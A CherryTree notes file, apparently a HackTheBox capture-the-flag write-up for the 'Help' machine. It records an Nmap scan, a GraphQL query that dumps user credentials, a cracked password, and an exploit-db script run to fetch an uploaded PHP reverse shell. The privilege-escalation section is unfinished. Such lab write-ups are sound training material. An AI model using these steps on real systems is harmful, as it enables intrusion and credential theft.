@@ -1,0 +1,134 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Help" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696590308" ts_lastsave="1696591018">
+    <rich_text>Nmap scan report for 10.129.227.176
+Host is up, received user-set (0.056s latency).
+Scanned at 2023-10-06 07:04:52 EDT for 44s
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
+|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
+80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
+|_http-title: Did not follow redirect to </rich_text>
+    <rich_text link="webs http://help.htb/">http://help.htb/</rich_text>
+    <rich_text>
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (89%), Linux 3.2 - 4.9 (89%), Linux 4.10 (88%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.94%E=4%D=10/6%OT=22%CT=1%CU=%PV=Y%DS=2%DC=T%G=N%TM=651FEA00%P=x86_64-pc-linux-gnu)
+SEQ(SP=FE%GCD=1%ISR=108%TI=Z%CI=I%TS=8)
+OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
+WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
+ECN(R=Y%DF=Y%TG=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=N)
+U1(R=N)
+IE(R=Y%DFI=N%TG=40%CD=S)
+</rich_text>
+    <node name="Enumeration" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696590312" ts_lastsave="1696592313">
+      <rich_text>We find port 80 open. We will need to register </rich_text>
+      <rich_text weight="heavy">help.htb</rich_text>
+      <rich_text> in </rich_text>
+      <rich_text style="italic">/etc/hosts</rich_text>
+      <rich_text>.
+On the server's root we find default Apache page.
+
+On endpoint </rich_text>
+      <rich_text style="italic">/support</rich_text>
+      <rich_text>, we find </rich_text>
+      <rich_text weight="heavy">HelpDeskZ 1.0.2</rich_text>
+      <rich_text> (we can see from </rich_text>
+      <rich_text link="webs http://help.htb/support/UPGRADING.txt)">http://help.htb/support/UPGRADING.txt)</rich_text>
+      <rich_text>.
+
+On </rich_text>
+      <rich_text weight="heavy">port 3000</rich_text>
+      <rich_text>, we find a webserver hosting an API.
+On endpoint </rich_text>
+      <rich_text weight="heavy">/graphql</rich_text>
+      <rich_text> we find a </rich_text>
+      <rich_text style="italic">graphql</rich_text>
+      <rich_text> instance.
+We can get the whole schema using this query:
+</rich_text>
+      <codebox char_offset="371" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">http://help.htb:3000/graphql?query={__schema{types{name,fields{name}}}}
+# We will find that we have "user" table.</codebox>
+    </node>
+    <node name="Exploit" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696590314" ts_lastsave="1696594488">
+      <rich_text>Using this query: </rich_text>
+      <rich_text link="webs http://help.htb:3000/graphql?query={user{username,password}}">http://help.htb:3000/graphql?query={user{username,password}}</rich_text>
+      <rich_text>, we can get the username and password:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+We can login in </rich_text>
+      <rich_text weight="heavy">support</rich_text>
+      <rich_text> endpoint, port 80.
+
+We can get a shell by using this exploit: </rich_text>
+      <rich_text link="webs https://www.exploit-db.com/exploits/40300">https://www.exploit-db.com/exploits/40300</rich_text>
+      <rich_text>.
+We will follow this:
+- create a ticket and upload a shell (ignore </rich_text>
+      <rich_text weight="heavy">File not permitted</rich_text>
+      <rich_text> error)
+- execute:
+</rich_text>
+      <codebox char_offset="118" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">username:helpme@helpme.com
+password:5d3c93182bb20f07b994a7f617e99cff - godhelpmeplz</codebox>
+      <codebox char_offset="353" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python2 exploitsupport1.py http://help.htb/support/uploads/tickets/ php-reverse-shell.php</codebox>
+    </node>
+    <node name="Privilege Escalation" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696590328" ts_lastsave="1696594625">
+      <rich_text>Initially, we are help.
+SUID:
+
+
+We are not able to run sudo.
+
+Linux Kernel:
+</rich_text>
+      <codebox char_offset="30" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">/usr/sbin/exim4
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/lib/s-nail/s-nail-privsep
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/bin/su
+/bin/ntfs-3g
+/bin/ping6
+/bin/mount
+/bin/umount
+/bin/fusermount
+/bin/ping</codebox>
+      <codebox char_offset="77" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">$ uname -a
+</codebox>
+    </node>
+  </node>
+</cherrytree>
